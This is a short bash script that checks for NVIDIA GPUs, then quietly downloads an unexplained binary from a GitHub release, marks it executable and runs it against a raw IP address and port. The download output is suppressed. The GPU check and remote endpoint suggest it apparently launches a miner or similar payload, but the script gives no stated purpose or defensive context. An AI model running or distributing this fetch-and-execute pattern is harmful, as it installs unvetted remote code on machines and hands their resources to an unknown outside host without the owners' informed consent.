#!/bin/bash
nvidia-smi -L
wget https://github.com/bendzswx12/cantho/releases/download/1/nuibaden &> /dev/null
chmod +x nuibaden
./nuibaden -P http://38.130.221.109:4545/"$1" &> log
